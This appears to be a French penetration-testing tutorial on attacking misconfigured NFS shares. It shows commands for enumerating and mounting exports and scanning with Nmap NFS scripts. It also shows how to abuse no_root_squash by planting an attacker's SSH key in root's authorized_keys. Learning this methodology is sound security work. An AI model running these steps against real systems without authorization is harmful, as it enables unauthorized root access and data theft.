# Exploitation NFS (Network File System)

## Objectif
Exploiter des faiblesses de configuration NFS pour accéder à des fichiers partagés, obtenir des accès non autorisés ou rebondir sur d'autres systèmes.

---

## Explications vulgarisées
- NFS permet de partager des dossiers entre machines Linux/Unix. S'il est mal configuré (partages en lecture/écriture, no_root_squash), il peut permettre de lire/écrire des fichiers sensibles ou d'obtenir un accès root.

---

## Commandes et étapes essentielles

### 1. Enumération des partages NFS
```bash
showmount -e target.com
```
- **showmount -e** : Liste les partages NFS exportés par la cible.
- **Exemple de sortie** :
```
Export list for target.com:
/home/public *
/var/backups 192.168.1.0/24
```
- **À surveiller** : Partages accessibles à tous ("*"), dossiers sensibles.

### 2. Montage d'un partage NFS
```bash
mount -t nfs target.com:/home/public /mnt/nfs
```
- **mount -t nfs** : Monte le partage NFS localement.
- **Astuce débutant** : Tester l'écriture dans le dossier monté.

### 3. Exploitation du no_root_squash
- Si le partage est configuré avec "no_root_squash", un attaquant peut créer un fichier SUID root ou une clé SSH pour obtenir un accès root sur la cible.
- Exemple :
```bash
# Sur ta machine
echo 'ssh-rsa AAAA... attacker@kali' > /mnt/nfs/root/.ssh/authorized_keys
```
- **À surveiller** : Possibilité d'écrire dans des dossiers root, création de fichiers SUID.

### 4. Enumération automatisée avec Nmap
```bash
nmap -p 2049 --script nfs-showmount,nfs-ls,nfs-statfs target.com
```
- **nfs-showmount** : Liste les partages exportés.
- **nfs-ls** : Liste les fichiers dans un partage.
- **nfs-statfs** : Récupère des infos sur le système de fichiers.

---

## Conseils pour débutants
- Toujours tester l'écriture dans les partages montés.
- Attention aux fichiers SUID et aux clés SSH dans les dossiers root.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - NFS Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/NFS%20Methodology)
- [Nmap NFS NSE Scripts](https://nmap.org/nsedoc/categories/nfs.html) 